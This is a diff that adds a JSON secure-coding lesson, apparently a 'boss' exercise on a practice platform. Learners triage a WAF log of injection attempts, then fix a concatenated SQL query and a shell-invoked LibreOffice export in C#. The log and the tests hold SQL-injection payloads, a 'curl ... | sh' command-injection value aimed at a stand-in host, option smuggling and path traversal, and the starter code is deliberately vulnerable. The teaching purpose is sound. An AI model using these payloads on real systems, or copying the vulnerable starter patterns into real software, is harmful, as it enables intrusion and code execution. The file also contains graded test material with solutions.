@@ -1,0 +1,182 @@
+{
+  "title": "Boss: the WAF log from Tuesday night",
+  "summary": "The web application firewall was in detection-only mode, and it logged a night of injection attempts. Find what got through, then fix the two endpoints it points at.",
+  "minutes": 35,
+  "kind": "boss",
+  "steps": [
+    {
+      "type": "learn",
+      "title": "waf.log, 02:10 to 02:14",
+      "body": [
+        "The WAF runs the OWASP Core Rule Set (CRS). Its rule ids say what it saw: **942xxx** SQL injection, **932xxx** Unix command injection, **930xxx** path traversal, **941xxx** XSS. It was set to **detection only** (`SecRuleEngine DetectionOnly`), so it logged and let everything through. The status code shows what the app answered.",
+        "",
+        "```text",
+        "2026-11-24T02:10:01Z 203.0.113.50 GET /api/reports/sales?region=north&month=2026-10 200",
+        "2026-11-24T02:10:07Z 203.0.113.50 GET /api/reports/sales?region=north'%20OR%20'1'='1&month=2026-10 200 rule=942100",
+        "2026-11-24T02:10:09Z 203.0.113.50 GET /api/reports/sales?region=x'%20UNION%20SELECT%20password_hash%20FROM%20users--&month=1 200 rule=942100",
+        "2026-11-24T02:11:30Z 203.0.113.50 GET /api/products/search?q=%27 400 rule=942100",
+        "2026-11-24T02:12:02Z 203.0.113.50 POST /api/export?format=pdf;curl%20http://203.0.113.50/x|sh&file=report-2026-10.ods 200 rule=932100",
+        "2026-11-24T02:12:40Z 203.0.113.50 GET /api/files?name=../../etc/passwd 404 rule=930100",
+        "2026-11-24T02:13:15Z 198.51.100.7 GET /api/products/search?q=lamp 200",
+        "2026-11-24T02:14:02Z 203.0.113.50 POST /api/export?format=xlsx&file=-env:UserInstallation=file:///tmp/x 200 rule=932100",
+        "```",
+        "",
+        "Matched rules with a **2xx** answer are the ones to worry about: the app accepted the payload. The `400` and `404` lines were refused by the app itself."
+      ]
+    },
+    {
+      "type": "code",
+      "title": "Triage: which endpoints accepted attacks?",
+      "prompt": [
+        "Write `List<string> AcceptedAttacks(string[] lines)`. Each line is `time ip METHOD target status [rule=id]`, separated by single spaces. Count the lines that have a `rule=` **and** a status from 200 to 299, per **path** (the target up to `?`). Return one string per path, `\"<path> <count>\"`, most attacks first, ties by path (ordinal).",
+        "",
+        "For the log above: `[\"/api/export 2\", \"/api/reports/sales 2\"]`."
+      ],
+      "starter": [
+        "List<string> AcceptedAttacks(string[] lines)",
+        "{",
+        "    return new List<string>();",
+        "}"
+      ],
+      "solution": [
+        "List<string> AcceptedAttacks(string[] lines)",
+        "{",
+        "    var counts = new Dictionary<string, int>();",
+        "    foreach (var line in lines)",
+        "    {",
+        "        var parts = line.Split(' ', StringSplitOptions.RemoveEmptyEntries);",
+        "        if (parts.Length < 6 || !parts.Skip(5).Any(p => p.StartsWith(\"rule=\"))) continue;",
+        "        if (!int.TryParse(parts[4], out var status) || status is < 200 or > 299) continue;",
+        "        var path = parts[3].Split('?')[0];",
+        "        counts[path] = counts.GetValueOrDefault(path) + 1;",
+        "    }",
+        "    return counts.OrderByDescending(kv => kv.Value).ThenBy(kv => kv.Key, StringComparer.Ordinal)",
+        "        .Select(kv => $\"{kv.Key} {kv.Value}\").ToList();",
+        "}"
+      ],
+      "hints": [
+        "`line.Split(' ')`: index 3 is the target, index 4 the status, and a rule, if any, comes after.",
+        "Count into a `Dictionary<string, int>`, then `OrderByDescending(kv => kv.Value).ThenBy(kv => kv.Key, StringComparer.Ordinal)`."
+      ],
+      "template": [
+        "{{CODE}}",
+        "",
+        "var dojoLog = new[]",
+        "{",
+        "    \"2026-11-24T02:10:01Z 203.0.113.50 GET /api/reports/sales?region=north&month=2026-10 200\",",
+        "    \"2026-11-24T02:10:07Z 203.0.113.50 GET /api/reports/sales?region=north'%20OR%20'1'='1&month=2026-10 200 rule=942100\",",
+        "    \"2026-11-24T02:10:09Z 203.0.113.50 GET /api/reports/sales?region=x'%20UNION%20SELECT%20password_hash%20FROM%20users--&month=1 200 rule=942100\",",
+        "    \"2026-11-24T02:11:30Z 203.0.113.50 GET /api/products/search?q=%27 400 rule=942100\",",
+        "    \"2026-11-24T02:12:02Z 203.0.113.50 POST /api/export?format=pdf;curl%20http://203.0.113.50/x|sh&file=report-2026-10.ods 200 rule=932100\",",
+        "    \"2026-11-24T02:12:40Z 203.0.113.50 GET /api/files?name=../../etc/passwd 404 rule=930100\",",
+        "    \"2026-11-24T02:13:15Z 198.51.100.7 GET /api/products/search?q=lamp 200\",",
+        "    \"2026-11-24T02:14:02Z 203.0.113.50 POST /api/export?format=xlsx&file=-env:UserInstallation=file:///tmp/x 200 rule=932100\",",
+        "};",
+        "Dojo.Eq(\"Tuesday's log\", new List<string> { \"/api/export 2\", \"/api/reports/sales 2\" }, AcceptedAttacks(dojoLog));",
+        "Dojo.Eq(\"an empty log\", new List<string>(), AcceptedAttacks(Array.Empty<string>()));",
+        "Dojo.Eq(\"refused attacks (4xx) and clean requests do not count\", new List<string>(), AcceptedAttacks(new[] { dojoLog[0], dojoLog[3], dojoLog[5], dojoLog[6] }));",
+        "Dojo.Eq(\"most first\", new List<string> { \"/b 2\", \"/a 1\" }, AcceptedAttacks(new[] { \"t i GET /a 201 rule=1\", \"t i GET /b?x=1 200 rule=2\", \"t i GET /b 204 rule=3\" }));"
+      ]
+    },
+    {
+      "type": "code",
+      "mode": "fix",
+      "framework": "efcore",
+      "title": "Fix the sales report",
+      "prompt": [
+        "`long MonthlySales(SqliteConnection db, string region, string month)` sums `total_cents` of the `sales` rows for one region and month (`month` like `2026-10`). Both values are glued into the SQL. Use **parameters** for both. A region or month that matches nothing gives `0`."
+      ],
+      "starter": [
+        "long MonthlySales(SqliteConnection db, string region, string month)",
+        "{",
+        "    using var cmd = db.CreateCommand();",
+        "    cmd.CommandText = \"SELECT coalesce(sum(total_cents), 0) FROM sales WHERE region = '\" + region + \"' AND month = '\" + month + \"'\";",
+        "    return (long)cmd.ExecuteScalar()!;",
+        "}"
+      ],
+      "solution": [
+        "long MonthlySales(SqliteConnection db, string region, string month)",
+        "{",
+        "    using var cmd = db.CreateCommand();",
+        "    cmd.CommandText = \"SELECT coalesce(sum(total_cents), 0) FROM sales WHERE region = $region AND month = $month\";",
+        "    cmd.Parameters.AddWithValue(\"$region\", region);",
+        "    cmd.Parameters.AddWithValue(\"$month\", month);",
+        "    return (long)cmd.ExecuteScalar()!;",
+        "}"
+      ],
+      "template": [
+        "{{CODE}}",
+        "",
+        "using var dojoDb = new SqliteConnection(\"Data Source=:memory:\");",
+        "dojoDb.Open();",
+        "using (var c = dojoDb.CreateCommand())",
+        "{",
+        "    c.CommandText = \"CREATE TABLE sales (region TEXT, month TEXT, total_cents INTEGER);\" +",
+        "        \"INSERT INTO sales VALUES ('north', '2026-10', 120000), ('north', '2026-10', 30000), ('south', '2026-10', 990000), ('north', '2026-09', 50000);\" +",
+        "        \"CREATE TABLE users (username TEXT, password_hash TEXT); INSERT INTO users VALUES ('admin', 'aaaa');\";",
+        "    c.ExecuteNonQuery();",
+        "}",
+        "Dojo.Try(\"north, October\", () => Dojo.Eq(\"north in 2026-10 sold 150000 cents\", 150000L, MonthlySales(dojoDb, \"north\", \"2026-10\")));",
+        "Dojo.Try(\"no sales\", () => Dojo.Eq(\"an empty month is 0\", 0L, MonthlySales(dojoDb, \"east\", \"2026-10\")));",
+        "Dojo.Try(\"the OR payload from the log\", () => Dojo.Eq(\"north' OR '1'='1 sums nothing\", 0L, MonthlySales(dojoDb, \"north' OR '1'='1\", \"2026-10\")));",
+        "Dojo.Try(\"a quote in the month\", () => Dojo.Eq(\"x' OR 1=1-- in month sums nothing\", 0L, MonthlySales(dojoDb, \"north\", \"x' OR 1=1--\")));",
+        "Dojo.Try(\"a region with an apostrophe\", () => Dojo.Eq(\"Hawke's Bay is a value, not SQL\", 0L, MonthlySales(dojoDb, \"Hawke's Bay\", \"2026-10\")));"
+      ],
+      "hints": [
+        "Two placeholders, `$region` and `$month`, and two `cmd.Parameters.AddWithValue(...)` calls."
+      ]
+    },
+    {
+      "type": "code",
+      "title": "Fix the export command",
+      "prompt": [
+        "The export converts a stored spreadsheet with LibreOffice. Write `ProcessStartInfo ExportCommand(string format, string file)` (`using System.Diagnostics;` and `using System.Text.RegularExpressions;`):",
+        "",
+        "- `format` must be one of `pdf`, `xlsx`, `csv` (exactly, lower case); `file` must match `^report-\\d{4}-\\d{2}\\.ods\\z`. Anything else throws `ArgumentException`;",
+        "- `FileName` is `libreoffice`, `UseShellExecute` is `false`, and `ArgumentList` is exactly `--headless`, `--convert-to`, `<format>`, `--outdir`, `/srv/exports`, `--`, `/srv/reports/<file>`.",
+        "",
+        "Both lines of the log with rule 932100 must be refused: the `;curl ... | sh` in `format`, and the `-env:...` option smuggled in as a file name."
+      ],
+      "starter": [
+        "using System.Diagnostics;",
+        "using System.Text.RegularExpressions;",
+        "",
+        "ProcessStartInfo ExportCommand(string format, string file) =>",
+        "    new ProcessStartInfo(\"/bin/sh\", $\"-c \\\"libreoffice --headless --convert-to {format} --outdir /srv/exports /srv/reports/{file}\\\"\");"
+      ],
+      "solution": [
+        "using System.Diagnostics;",
+        "using System.Text.RegularExpressions;",
+        "",
+        "ProcessStartInfo ExportCommand(string format, string file)",
+        "{",
+        "    string[] formats = [\"pdf\", \"xlsx\", \"csv\"];",
+        "    if (!formats.Contains(format)) throw new ArgumentException(\"Unknown format.\", nameof(format));",
+        "    if (!Regex.IsMatch(file, @\"^report-\\d{4}-\\d{2}\\.ods\\z\")) throw new ArgumentException(\"Unknown report.\", nameof(file));",
+        "    var psi = new ProcessStartInfo(\"libreoffice\") { UseShellExecute = false };",
+        "    foreach (var a in new[] { \"--headless\", \"--convert-to\", format, \"--outdir\", \"/srv/exports\", \"--\", \"/srv/reports/\" + file })",
+        "        psi.ArgumentList.Add(a);",
+        "    return psi;",
+        "}"
+      ],
+      "template": [
+        "{{CODE}}",
+        "",
+        "var ok = ExportCommand(\"pdf\", \"report-2026-10.ods\");",
+        "Dojo.Eq(\"no shell: FileName is libreoffice\", \"libreoffice\", ok.FileName);",
+        "Dojo.Eq(\"UseShellExecute is false\", false, ok.UseShellExecute);",
+        "Dojo.Eq(\"the arguments, one by one\", new List<string> { \"--headless\", \"--convert-to\", \"pdf\", \"--outdir\", \"/srv/exports\", \"--\", \"/srv/reports/report-2026-10.ods\" }, ok.ArgumentList.ToList());",
+        "Dojo.Eq(\"xlsx works\", \"xlsx\", ExportCommand(\"xlsx\", \"report-2026-09.ods\").ArgumentList[2]);",
+        "Dojo.Throws<ArgumentException>(\"the log's format payload is refused\", () => ExportCommand(\"pdf;curl http://203.0.113.50/x|sh\", \"report-2026-10.ods\"));",
+        "Dojo.Throws<ArgumentException>(\"the log's option-as-file-name is refused\", () => ExportCommand(\"xlsx\", \"-env:UserInstallation=file:///tmp/x\"));",
+        "Dojo.Throws<ArgumentException>(\"a traversal file name is refused\", () => ExportCommand(\"pdf\", \"../../etc/passwd\"));",
+        "Dojo.Throws<ArgumentException>(\"an upper-case format is refused\", () => ExportCommand(\"PDF\", \"report-2026-10.ods\"));",
+        "Dojo.Throws<ArgumentException>(\"a trailing newline is refused\", () => ExportCommand(\"pdf\", \"report-2026-10.ods\\n\"));"
+      ],
+      "hints": [
+        "An allow-list for the format (`new[] { \"pdf\", \"xlsx\", \"csv\" }.Contains(format)`) and a regex for the file; `\\z` (not `$`) so a trailing newline cannot slip through.",
+        "Then `new ProcessStartInfo(\"libreoffice\") { UseShellExecute = false }` and `ArgumentList.Add` for each argument, with `--` before the path."
+      ]
+    }
+  ]
+}
